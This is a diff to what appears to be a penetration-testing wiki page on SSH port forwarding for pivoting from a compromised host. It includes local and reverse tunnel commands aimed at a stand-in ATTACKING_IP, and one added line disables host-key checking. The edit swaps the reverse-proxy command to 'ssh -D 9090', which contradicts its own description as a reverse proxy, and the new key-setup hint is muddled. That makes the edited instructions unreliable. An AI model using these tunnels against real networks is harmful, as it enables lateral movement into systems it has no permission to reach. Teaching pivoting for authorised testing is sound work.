@@ -30,6 +30,8 @@ By using a SSH client with an OpenSSH server, it's possible to create both forwa
 Microsoft has introduced its native implementation of the OpenSSH server for Windows. So this technique may works with both UNIX and Windows servers/clients.
 {% endhint %}
 
+
+
 {% tabs %}
 {% tab title="SSH Local Forwarding" %}
 This example opens a connection to the jump-server.net, and forwards any connection to port 80 on the local machine (attacking machine) to port 80 of intra.example.com.
@@ -47,7 +49,7 @@ veresk@kali$ ssh -L *:80:intra.example.com:80 user@jump-server.net -fN
 On the compromised computer (jump-box), we can connect back to the attacking machine with a reverse port forward using the following command, this example produce the same result as previously seen with Local-Forwarding. Any connection on `ATTACKING_IP:8000` will be redirected on `intra.example.com:80`
 
 ```bash
-PC> ssh -R 8000:intra.example.com:80 tunneluser@ATTACKING_IP -fN
+PC> ssh -R 8000:intra.example.com:80 tunneluser@ATTACKING_IP -i KEYFILE -o StrictHostKeyChecking=no -fN
 ```
 
 {% hint style="info" %}
@@ -59,11 +61,17 @@ passwd tunneluser
 ```
 {% endhint %}
 
-In newer versions of the SSH client, it is also possible to create a **reverse proxy** (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
+{% hint style="info" %}
+Ensure to generate SSH keys for the tunnel user, and subsequently, add the generated public key to both the `authorized_keys` file and the jump box.
+{% endhint %}
+
+In newer versions of the SSH client, it is also possible to create a **reverse proxy** (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it.
 
 ```bash
-PC> ssh -R 9090 tunneluser@ATTACKING_IP -fN
+PC> ssh -D 9090 tunneluser@ATTACKING_IP -fN
 ```
+
+&#x20;See the [Chisel](portfwd.md#chisel) section if you don't know how to use this proxy connection.
 {% endtab %}
 {% endtabs %}
 
